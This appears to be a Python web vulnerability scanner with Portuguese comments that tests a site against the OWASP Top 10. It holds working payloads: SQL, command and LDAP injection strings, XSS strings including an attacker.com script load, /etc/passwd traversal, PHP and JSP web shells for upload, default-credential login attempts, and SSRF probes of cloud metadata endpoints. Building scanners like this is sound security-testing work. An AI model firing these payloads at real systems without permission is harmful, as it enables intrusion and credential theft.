"""
Scanner de Vulnerabilidades OWASP Top 10
- A01: Broken Access Control
- A02: Cryptographic Failures
- A03: Injection (SQL, XSS, Command Injection)
- A04: Insecure Design
- A05: Security Misconfiguration
- A06: Vulnerable and Outdated Components
- A07: Identification and Authentication Failures
- A08: Software and Data Integrity Failures
- A09: Security Logging and Monitoring Failures
- A10: Server-Side Request Forgery (SSRF)
"""

import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Set
import re
import time
import json


class VulnerabilityScanner:
    def __init__(self, base_url: str, timeout: int = 10):
        self.base_url = base_url
        self.timeout = timeout
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def scan_all(self, endpoints: List[str] = None, forms: List[Dict] = None):
        """Executa todos os testes de vulnerabilidade"""
        print("[*] Iniciando scan completo de vulnerabilidades OWASP...")

        if endpoints is None:
            endpoints = [self.base_url]

        # A03: Injection
        self.test_sql_injection(endpoints, forms)
        self.test_xss(endpoints, forms)
        self.test_command_injection(endpoints, forms)
        self.test_ldap_injection(endpoints, forms)

        # A01: Broken Access Control
        self.test_path_traversal(endpoints)
        self.test_idor(endpoints)
        self.test_unrestricted_file_upload(forms)

        # A02: Cryptographic Failures
        self.test_sensitive_data_exposure(endpoints)
        self.test_weak_crypto()

        # A05: Security Misconfiguration
        self.test_security_headers()
        self.test_directory_listing(endpoints)
        self.test_default_credentials()
        self.test_verbose_errors(endpoints)

        # A07: Authentication Failures
        self.test_weak_authentication(forms)
        self.test_session_fixation()

        # A08: Software and Data Integrity Failures
        self.test_insecure_deserialization(endpoints, forms)

        # A10: SSRF
        self.test_ssrf(endpoints, forms)

        # Testes adicionais
        self.test_cors_misconfiguration()
        self.test_open_redirect(endpoints, forms)
        self.test_csrf(forms)

        print(f"\n[+] Scan completo! {len(self.vulnerabilities)} vulnerabilidades encontradas")

        return self.vulnerabilities

    # ===== A03: INJECTION =====

    def test_sql_injection(self, endpoints: List[str], forms: List[Dict] = None):
        """Testa SQL Injection"""
        print("\n[*] Testando SQL Injection...")

        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR 1=1--",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",
            "' WAITFOR DELAY '0:0:5'--",
            "1; SELECT SLEEP(5)--",
            "' AND SLEEP(5)--"
        ]

        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.*SQL[-_ ]*Server",
            r"OLE DB.*SQL Server",
            r"SQLServer JDBC Driver",
            r"SqlClient\.",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Warning.*ora_.*"
        ]

        # Testa em parâmetros GET
        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)

            if params:
                for param_name in params.keys():
                    for payload in payloads:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, urlencode(test_params, doseq=True),
                            parsed.fragment
                        ))

                        try:
                            response = self.session.get(test_url, timeout=self.timeout)

                            # Verifica erros SQL
                            for pattern in error_patterns:
                                if re.search(pattern, response.text, re.IGNORECASE):
                                    self._add_vulnerability(
                                        'SQL Injection',
                                        'HIGH',
                                        endpoint,
                                        f"Parâmetro '{param_name}' vulnerável a SQL Injection",
                                        {'payload': payload, 'param': param_name}
                                    )
                                    print(f"[!] SQL Injection encontrado: {endpoint} (param: {param_name})")
                                    break

                            # Time-based detection
                            if 'SLEEP' in payload or 'WAITFOR' in payload:
                                start = time.time()
                                response = self.session.get(test_url, timeout=self.timeout)
                                elapsed = time.time() - start

                                if elapsed >= 5:
                                    self._add_vulnerability(
                                        'SQL Injection (Time-based)',
                                        'HIGH',
                                        endpoint,
                                        f"Parâmetro '{param_name}' vulnerável a Time-based SQL Injection",
                                        {'payload': payload, 'param': param_name, 'delay': elapsed}
                                    )
                                    print(f"[!] Time-based SQL Injection: {endpoint}")

                        except requests.Timeout:
                            pass
                        except Exception as e:
                            pass

        # Testa em formulários POST
        if forms:
            for form in forms:
                for payload in payloads[:5]:  # Reduz payloads para forms
                    form_data = {}
                    vulnerable_field = None

                    for input_field in form['inputs']:
                        if input_field['name']:
                            form_data[input_field['name']] = payload
                            vulnerable_field = input_field['name']

                    try:
                        if form['method'] == 'post':
                            response = self.session.post(form['action'], data=form_data,
                                                        timeout=self.timeout)
                        else:
                            response = self.session.get(form['action'], params=form_data,
                                                       timeout=self.timeout)

                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                self._add_vulnerability(
                                    'SQL Injection',
                                    'HIGH',
                                    form['action'],
                                    f"Campo de formulário '{vulnerable_field}' vulnerável",
                                    {'payload': payload, 'field': vulnerable_field}
                                )
                                print(f"[!] SQL Injection em formulário: {form['action']}")
                                break

                    except Exception as e:
                        pass

    def test_xss(self, endpoints: List[str], forms: List[Dict] = None):
        """Testa Cross-Site Scripting (XSS)"""
        print("\n[*] Testando XSS (Cross-Site Scripting)...")

        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"javascript:alert('XSS')\">",
            "<IMG SRC=# onmouseover=\"alert('XSS')\">",
            "<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>"
        ]

        # Testa Reflected XSS em parâmetros GET
        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)

            if params:
                for param_name in params.keys():
                    for payload in payloads:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, urlencode(test_params, doseq=True),
                            parsed.fragment
                        ))

                        try:
                            response = self.session.get(test_url, timeout=self.timeout)

                            # Verifica se payload está refletido sem sanitização
                            if payload in response.text:
                                self._add_vulnerability(
                                    'Reflected XSS',
                                    'HIGH',
                                    endpoint,
                                    f"Parâmetro '{param_name}' vulnerável a Reflected XSS",
                                    {'payload': payload, 'param': param_name}
                                )
                                print(f"[!] Reflected XSS encontrado: {endpoint} (param: {param_name})")
                                break

                        except Exception as e:
                            pass

        # Testa em formulários
        if forms:
            for form in forms:
                for payload in payloads[:5]:
                    form_data = {}

                    for input_field in form['inputs']:
                        if input_field['name']:
                            form_data[input_field['name']] = payload

                    try:
                        if form['method'] == 'post':
                            response = self.session.post(form['action'], data=form_data,
                                                        timeout=self.timeout)
                        else:
                            response = self.session.get(form['action'], params=form_data,
                                                       timeout=self.timeout)

                        if payload in response.text:
                            self._add_vulnerability(
                                'Reflected XSS',
                                'HIGH',
                                form['action'],
                                "Formulário vulnerável a XSS",
                                {'payload': payload}
                            )
                            print(f"[!] XSS em formulário: {form['action']}")
                            break

                    except Exception as e:
                        pass

    def test_command_injection(self, endpoints: List[str], forms: List[Dict] = None):
        """Testa Command Injection"""
        print("\n[*] Testando Command Injection...")

        payloads = [
            "; ls",
            "| ls",
            "& ls",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "; ping -c 4 127.0.0.1",
            "| ping -c 4 127.0.0.1"
        ]

        indicators = [
            'root:x:', 'bin/bash', 'etc/passwd', 'uid=', 'gid=',
            'total ', 'drwx', '-rw-', 'PING', '64 bytes'
        ]

        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)

            if params:
                for param_name in params.keys():
                    for payload in payloads:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, urlencode(test_params, doseq=True),
                            parsed.fragment
                        ))

                        try:
                            response = self.session.get(test_url, timeout=self.timeout)

                            for indicator in indicators:
                                if indicator in response.text:
                                    self._add_vulnerability(
                                        'Command Injection',
                                        'CRITICAL',
                                        endpoint,
                                        f"Parâmetro '{param_name}' vulnerável a Command Injection",
                                        {'payload': payload, 'param': param_name}
                                    )
                                    print(f"[!] Command Injection: {endpoint}")
                                    break

                        except Exception as e:
                            pass

    def test_ldap_injection(self, endpoints: List[str], forms: List[Dict] = None):
        """Testa LDAP Injection"""
        print("\n[*] Testando LDAP Injection...")

        payloads = [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin*",
            "admin*)((|userPassword=*",
        ]

        # Testa apenas em endpoints que parecem ser de autenticação
        auth_keywords = ['login', 'auth', 'ldap', 'user', 'account']

        for endpoint in endpoints:
            if any(keyword in endpoint.lower() for keyword in auth_keywords):
                parsed = urlparse(endpoint)
                params = parse_qs(parsed.query)

                if params:
                    for param_name in params.keys():
                        for payload in payloads:
                            test_params = params.copy()
                            test_params[param_name] = [payload]
                            test_url = urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, urlencode(test_params, doseq=True),
                                parsed.fragment
                            ))

                            try:
                                response = self.session.get(test_url, timeout=self.timeout)

                                # Procura por indicadores de LDAP errors
                                if any(err in response.text.lower() for err in
                                       ['ldap', 'javax.naming', 'LdapException']):
                                    self._add_vulnerability(
                                        'LDAP Injection',
                                        'HIGH',
                                        endpoint,
                                        f"Possível LDAP Injection no parâmetro '{param_name}'",
                                        {'payload': payload, 'param': param_name}
                                    )
                                    print(f"[!] LDAP Injection: {endpoint}")

                            except Exception as e:
                                pass

    # ===== A01: BROKEN ACCESS CONTROL =====

    def test_path_traversal(self, endpoints: List[str]):
        """Testa Path Traversal / Directory Traversal"""
        print("\n[*] Testando Path Traversal...")

        payloads = [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        indicators = ['root:x:', '[extensions]', 'for 16-bit app support']

        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)

            if params:
                for param_name in params.keys():
                    for payload in payloads:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, urlencode(test_params, doseq=True),
                            parsed.fragment
                        ))

                        try:
                            response = self.session.get(test_url, timeout=self.timeout)

                            for indicator in indicators:
                                if indicator in response.text:
                                    self._add_vulnerability(
                                        'Path Traversal',
                                        'HIGH',
                                        endpoint,
                                        f"Parâmetro '{param_name}' vulnerável a Path Traversal",
                                        {'payload': payload, 'param': param_name}
                                    )
                                    print(f"[!] Path Traversal: {endpoint}")
                                    break

                        except Exception as e:
                            pass

    def test_idor(self, endpoints: List[str]):
        """Testa Insecure Direct Object Reference (IDOR)"""
        print("\n[*] Testando IDOR (Insecure Direct Object Reference)...")

        # Procura por parâmetros que parecem ser IDs
        id_params = ['id', 'user_id', 'userid', 'user', 'account', 'doc', 'file']

        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)

            if params:
                for param_name in params.keys():
                    if any(id_param in param_name.lower() for id_param in id_params):
                        original_value = params[param_name][0]

                        # Tenta valores diferentes
                        test_values = ['1', '2', '100', '999', '0', '-1']

                        try:
                            # Requisição original
                            original_response = self.session.get(endpoint, timeout=self.timeout)
                            original_status = original_response.status_code
                            original_length = len(original_response.text)

                            for test_value in test_values:
                                test_params = params.copy()
                                test_params[param_name] = [test_value]
                                test_url = urlunparse((
                                    parsed.scheme, parsed.netloc, parsed.path,
                                    parsed.params, urlencode(test_params, doseq=True),
                                    parsed.fragment
                                ))

                                test_response = self.session.get(test_url, timeout=self.timeout)

                                # Se retorna 200 com conteúdo diferente, pode ser IDOR
                                if (test_response.status_code == 200 and
                                    abs(len(test_response.text) - original_length) > 100):

                                    self._add_vulnerability(
                                        'IDOR (Insecure Direct Object Reference)',
                                        'MEDIUM',
                                        endpoint,
                                        f"Possível IDOR no parâmetro '{param_name}'",
                                        {
                                            'param': param_name,
                                            'original_value': original_value,
                                            'test_value': test_value
                                        }
                                    )
                                    print(f"[!] Possível IDOR: {endpoint}")
                                    break

                        except Exception as e:
                            pass

    def test_unrestricted_file_upload(self, forms: List[Dict]):
        """Testa Unrestricted File Upload"""
        print("\n[*] Testando Unrestricted File Upload...")

        if not forms:
            return

        for form in forms:
            # Procura por inputs de arquivo
            file_inputs = [inp for inp in form['inputs']
                          if inp['type'] == 'file']

            if file_inputs:
                # Testa upload de arquivo potencialmente malicioso
                malicious_files = {
                    'shell.php': '<?php system($_GET["cmd"]); ?>',
                    'shell.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
                    'shell.aspx': '<%@ Page Language="C#" %><%Response.Write(System.DateTime.Now);%>'
                }

                for filename, content in malicious_files.items():
                    try:
                        files = {file_inputs[0]['name']: (filename, content)}
                        response = self.session.post(form['action'], files=files,
                                                    timeout=self.timeout)

                        if response.status_code == 200 and 'error' not in response.text.lower():
                            self._add_vulnerability(
                                'Unrestricted File Upload',
                                'CRITICAL',
                                form['action'],
                                "Formulário permite upload de arquivos potencialmente maliciosos",
                                {'filename': filename}
                            )
                            print(f"[!] Unrestricted File Upload: {form['action']}")
                            break

                    except Exception as e:
                        pass

    # ===== A02: CRYPTOGRAPHIC FAILURES =====

    def test_sensitive_data_exposure(self, endpoints: List[str]):
        """Testa exposição de dados sensíveis"""
        print("\n[*] Testando Sensitive Data Exposure...")

        sensitive_patterns = {
            'API Key': r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]+)["\']',
            'AWS Key': r'AKIA[0-9A-Z]{16}',
            'Private Key': r'-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----',
            'Password': r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            'Token': r'token["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-\.]+)["\']',
            'Database Connection': r'(mongodb|mysql|postgres)://[^\s]+',
            'Email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'Credit Card': r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',
        }

        for endpoint in endpoints:
            try:
                response = self.session.get(endpoint, timeout=self.timeout)

                for data_type, pattern in sensitive_patterns.items():
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    if matches:
                        self._add_vulnerability(
                            'Sensitive Data Exposure',
                            'MEDIUM',
                            endpoint,
                            f"Exposição de {data_type} detectada",
                            {'data_type': data_type, 'matches_count': len(matches)}
                        )
                        print(f"[!] Sensitive Data Exposure ({data_type}): {endpoint}")

            except Exception as e:
                pass

    def test_weak_crypto(self):
        """Testa configurações criptográficas fracas"""
        print("\n[*] Testando Weak Cryptography...")

        try:
            response = self.session.get(self.base_url, timeout=self.timeout)

            # Verifica HTTPS
            if not self.base_url.startswith('https://'):
                self._add_vulnerability(
                    'Insecure Protocol',
                    'MEDIUM',
                    self.base_url,
                    "Site não usa HTTPS",
                    {}
                )
                print(f"[!] Site não usa HTTPS: {self.base_url}")

        except Exception as e:
            pass

    # ===== A05: SECURITY MISCONFIGURATION =====

    def test_security_headers(self):
        """Testa presença de security headers"""
        print("\n[*] Testando Security Headers...")

        required_headers = {
            'Strict-Transport-Security': 'HSTS não configurado',
            'X-Frame-Options': 'X-Frame-Options ausente (Clickjacking)',
            'X-Content-Type-Options': 'X-Content-Type-Options ausente',
            'Content-Security-Policy': 'CSP não configurado',
            'X-XSS-Protection': 'X-XSS-Protection ausente',
            'Referrer-Policy': 'Referrer-Policy não configurado'
        }

        try:
            response = self.session.get(self.base_url, timeout=self.timeout)

            for header, description in required_headers.items():
                if header not in response.headers:
                    self._add_vulnerability(
                        'Missing Security Header',
                        'LOW',
                        self.base_url,
                        description,
                        {'header': header}
                    )
                    print(f"[!] Security Header ausente: {header}")

            # Verifica se há headers que revelam informação
            disclosure_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in disclosure_headers:
                if header in response.headers:
                    self._add_vulnerability(
                        'Information Disclosure',
                        'INFO',
                        self.base_url,
                        f"Header '{header}' revela informação: {response.headers[header]}",
                        {'header': header, 'value': response.headers[header]}
                    )

        except Exception as e:
            pass

    def test_directory_listing(self, endpoints: List[str]):
        """Testa Directory Listing"""
        print("\n[*] Testando Directory Listing...")

        indicators = [
            'Index of /',
            'Parent Directory',
            '[To Parent Directory]',
            '<title>Index of',
            'Directory Listing'
        ]

        for endpoint in endpoints:
            try:
                response = self.session.get(endpoint, timeout=self.timeout)

                if any(indicator in response.text for indicator in indicators):
                    self._add_vulnerability(
                        'Directory Listing Enabled',
                        'LOW',
                        endpoint,
                        "Directory listing está habilitado",
                        {}
                    )
                    print(f"[!] Directory Listing: {endpoint}")

            except Exception as e:
                pass

    def test_default_credentials(self):
        """Testa credenciais padrão"""
        print("\n[*] Testando Default Credentials...")

        # Lista de credenciais comuns
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '12345'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('root', 'toor'),
            ('user', 'user'),
            ('test', 'test'),
        ]

        # Procura por páginas de login
        login_paths = ['/login', '/admin', '/administrator', '/wp-login.php']

        for path in login_paths:
            url = urljoin(self.base_url, path)
            try:
                response = self.session.get(url, timeout=self.timeout)

                if response.status_code == 200:
                    # Testa credenciais
                    for username, password in default_creds:
                        data = {'username': username, 'password': password}

                        try:
                            auth_response = self.session.post(url, data=data,
                                                             timeout=self.timeout,
                                                             allow_redirects=False)

                            # Se redireciona ou retorna 200, pode ter autenticado
                            if auth_response.status_code in [200, 301, 302]:
                                if 'dashboard' in auth_response.text.lower() or \
                                   'welcome' in auth_response.text.lower() or \
                                   'logout' in auth_response.text.lower():

                                    self._add_vulnerability(
                                        'Default Credentials',
                                        'CRITICAL',
                                        url,
                                        f"Credenciais padrão aceitas: {username}/{password}",
                                        {'username': username, 'password': password}
                                    )
                                    print(f"[!] Default Credentials: {url} ({username}/{password})")

                        except Exception as e:
                            pass

            except Exception as e:
                pass

    def test_verbose_errors(self, endpoints: List[str]):
        """Testa mensagens de erro verbose"""
        print("\n[*] Testando Verbose Error Messages...")

        # Payloads para causar erros
        error_payloads = ["'", '"', '<', '>', '..', '\\', '\x00']

        error_indicators = [
            'Fatal error:', 'Warning:', 'Notice:',
            'Traceback', 'Exception', 'Stack trace',
            'syntax error', 'Parse error', 'undefined',
            'mysql_fetch', 'pg_exec', 'SQLSTATE'
        ]

        for endpoint in endpoints[:5]:  # Limita para não sobrecarregar
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)

            if params:
                for param_name in params.keys():
                    for payload in error_payloads:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, urlencode(test_params, doseq=True),
                            parsed.fragment
                        ))

                        try:
                            response = self.session.get(test_url, timeout=self.timeout)

                            for indicator in error_indicators:
                                if indicator in response.text:
                                    self._add_vulnerability(
                                        'Verbose Error Messages',
                                        'LOW',
                                        endpoint,
                                        "Aplicação revela informações detalhadas de erro",
                                        {'param': param_name, 'indicator': indicator}
                                    )
                                    print(f"[!] Verbose Errors: {endpoint}")
                                    break

                        except Exception as e:
                            pass

    # ===== A07: AUTHENTICATION FAILURES =====

    def test_weak_authentication(self, forms: List[Dict]):
        """Testa autenticação fraca"""
        print("\n[*] Testando Weak Authentication...")

        if not forms:
            return

        for form in forms:
            # Procura por formulários de login
            if form['method'] == 'post':
                input_names = [inp['name'] for inp in form['inputs'] if inp['name']]

                # Verifica se parece ser formulário de login
                login_indicators = ['user', 'email', 'login', 'pass', 'password']
                if any(any(ind in name.lower() for ind in login_indicators)
                       for name in input_names):

                    # Testa rate limiting
                    try:
                        for i in range(10):
                            data = {name: f'test{i}' for name in input_names}
                            response = self.session.post(form['action'], data=data,
                                                        timeout=self.timeout)

                        # Se não bloqueou após 10 tentativas
                        self._add_vulnerability(
                            'No Rate Limiting',
                            'MEDIUM',
                            form['action'],
                            "Formulário de login sem rate limiting (permite brute force)",
                            {}
                        )
                        print(f"[!] No Rate Limiting: {form['action']}")

                    except Exception as e:
                        pass

    def test_session_fixation(self):
        """Testa Session Fixation"""
        print("\n[*] Testando Session Fixation...")

        try:
            # Primeira requisição
            response1 = self.session.get(self.base_url, timeout=self.timeout)
            cookies1 = self.session.cookies.get_dict()

            # Segunda requisição
            response2 = self.session.get(self.base_url, timeout=self.timeout)
            cookies2 = self.session.cookies.get_dict()

            # Se o cookie de sessão é o mesmo, pode ter fixation
            session_cookies = ['PHPSESSID', 'JSESSIONID', 'ASP.NET_SessionId', 'session']

            for cookie_name in session_cookies:
                if (cookie_name in cookies1 and cookie_name in cookies2 and
                    cookies1[cookie_name] == cookies2[cookie_name]):

                    self._add_vulnerability(
                        'Possible Session Fixation',
                        'MEDIUM',
                        self.base_url,
                        f"Cookie de sessão '{cookie_name}' não muda entre requisições",
                        {'cookie': cookie_name}
                    )
                    print(f"[!] Possible Session Fixation: {cookie_name}")

        except Exception as e:
            pass

    # ===== A08: SOFTWARE AND DATA INTEGRITY FAILURES =====

    def test_insecure_deserialization(self, endpoints: List[str], forms: List[Dict]):
        """Testa Insecure Deserialization"""
        print("\n[*] Testando Insecure Deserialization...")

        # Payloads básicos de serialização
        payloads = [
            'O:8:"stdClass":0:{}',  # PHP
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAU=',  # Java
            'YToxOntpOjA7czoxOiJhIjt9',  # Base64 PHP serialized
        ]

        for endpoint in endpoints[:5]:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)

            if params:
                for param_name in params.keys():
                    for payload in payloads:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, urlencode(test_params, doseq=True),
                            parsed.fragment
                        ))

                        try:
                            response = self.session.get(test_url, timeout=self.timeout)

                            error_patterns = [
                                'unserialize()',
                                'ObjectInputStream',
                                'pickle.loads',
                                'Serialization',
                                'deserialize'
                            ]

                            for pattern in error_patterns:
                                if pattern in response.text:
                                    self._add_vulnerability(
                                        'Possible Insecure Deserialization',
                                        'HIGH',
                                        endpoint,
                                        f"Parâmetro '{param_name}' pode ser vulnerável a deserialization",
                                        {'payload': payload, 'param': param_name}
                                    )
                                    print(f"[!] Possible Insecure Deserialization: {endpoint}")
                                    break

                        except Exception as e:
                            pass

    # ===== A10: SSRF =====

    def test_ssrf(self, endpoints: List[str], forms: List[Dict]):
        """Testa Server-Side Request Forgery (SSRF)"""
        print("\n[*] Testando SSRF (Server-Side Request Forgery)...")

        # Payloads SSRF
        payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP
            'file:///etc/passwd',
            'http://[::1]',
        ]

        # Procura por parâmetros que aceitam URLs
        url_params = ['url', 'uri', 'path', 'dest', 'redirect', 'file', 'download', 'load']

        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)

            if params:
                for param_name in params.keys():
                    if any(up in param_name.lower() for up in url_params):
                        for payload in payloads:
                            test_params = params.copy()
                            test_params[param_name] = [payload]
                            test_url = urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, urlencode(test_params, doseq=True),
                                parsed.fragment
                            ))

                            try:
                                response = self.session.get(test_url, timeout=self.timeout)

                                # Indicadores de SSRF bem-sucedido
                                ssrf_indicators = [
                                    'root:x:',
                                    'localhost',
                                    '127.0.0.1',
                                    'ami-id',
                                    'instance-id'
                                ]

                                for indicator in ssrf_indicators:
                                    if indicator in response.text:
                                        self._add_vulnerability(
                                            'SSRF (Server-Side Request Forgery)',
                                            'CRITICAL',
                                            endpoint,
                                            f"Parâmetro '{param_name}' vulnerável a SSRF",
                                            {'payload': payload, 'param': param_name}
                                        )
                                        print(f"[!] SSRF encontrado: {endpoint}")
                                        break

                            except Exception as e:
                                pass

    # ===== TESTES ADICIONAIS =====

    def test_cors_misconfiguration(self):
        """Testa CORS misconfiguration"""
        print("\n[*] Testando CORS Misconfiguration...")

        malicious_origins = [
            'http://evil.com',
            'null',
            'http://localhost'
        ]

        for origin in malicious_origins:
            try:
                headers = {'Origin': origin}
                response = self.session.get(self.base_url, headers=headers,
                                           timeout=self.timeout)

                acao = response.headers.get('Access-Control-Allow-Origin')
                acac = response.headers.get('Access-Control-Allow-Credentials')

                if acao == origin or acao == '*':
                    severity = 'HIGH' if acac == 'true' else 'MEDIUM'
                    self._add_vulnerability(
                        'CORS Misconfiguration',
                        severity,
                        self.base_url,
                        f"CORS permite origem: {acao}",
                        {'origin': origin, 'allow_credentials': acac}
                    )
                    print(f"[!] CORS Misconfiguration: permite {origin}")

            except Exception as e:
                pass

    def test_open_redirect(self, endpoints: List[str], forms: List[Dict]):
        """Testa Open Redirect"""
        print("\n[*] Testando Open Redirect...")

        redirect_payloads = [
            'http://evil.com',
            '//evil.com',
            '///evil.com',
            'javascript:alert(1)',
        ]

        redirect_params = ['url', 'redirect', 'return', 'next', 'redir', 'target', 'dest']

        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)

            if params:
                for param_name in params.keys():
                    if any(rp in param_name.lower() for rp in redirect_params):
                        for payload in redirect_payloads:
                            test_params = params.copy()
                            test_params[param_name] = [payload]
                            test_url = urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, urlencode(test_params, doseq=True),
                                parsed.fragment
                            ))

                            try:
                                response = self.session.get(test_url, timeout=self.timeout,
                                                           allow_redirects=False)

                                if response.status_code in [301, 302, 303, 307, 308]:
                                    location = response.headers.get('Location', '')
                                    if 'evil.com' in location or payload in location:
                                        self._add_vulnerability(
                                            'Open Redirect',
                                            'MEDIUM',
                                            endpoint,
                                            f"Parâmetro '{param_name}' vulnerável a Open Redirect",
                                            {'payload': payload, 'param': param_name}
                                        )
                                        print(f"[!] Open Redirect: {endpoint}")
                                        break

                            except Exception as e:
                                pass

    def test_csrf(self, forms: List[Dict]):
        """Testa CSRF (Cross-Site Request Forgery)"""
        print("\n[*] Testando CSRF (Cross-Site Request Forgery)...")

        if not forms:
            return

        csrf_tokens = ['csrf', 'token', '_token', 'csrf_token', 'authenticity_token']

        for form in forms:
            if form['method'] == 'post':
                # Verifica se há token CSRF
                has_csrf = False

                for input_field in form['inputs']:
                    if input_field['name']:
                        if any(token in input_field['name'].lower() for token in csrf_tokens):
                            has_csrf = True
                            break

                if not has_csrf:
                    self._add_vulnerability(
                        'Missing CSRF Protection',
                        'MEDIUM',
                        form['action'],
                        "Formulário POST sem proteção CSRF",
                        {}
                    )
                    print(f"[!] Missing CSRF: {form['action']}")

    # ===== HELPERS =====

    def _add_vulnerability(self, vuln_type: str, severity: str, url: str,
                          description: str, details: Dict):
        """Adiciona vulnerabilidade à lista"""
        self.vulnerabilities.append({
            'type': vuln_type,
            'severity': severity,
            'url': url,
            'description': description,
            'details': details,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        })

    def get_report(self) -> Dict:
        """Retorna relatório de vulnerabilidades"""
        return {
            'total_vulnerabilities': len(self.vulnerabilities),
            'by_severity': {
                'CRITICAL': len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']),
                'HIGH': len([v for v in self.vulnerabilities if v['severity'] == 'HIGH']),
                'MEDIUM': len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']),
                'LOW': len([v for v in self.vulnerabilities if v['severity'] == 'LOW']),
                'INFO': len([v for v in self.vulnerabilities if v['severity'] == 'INFO']),
            },
            'vulnerabilities': self.vulnerabilities
        }
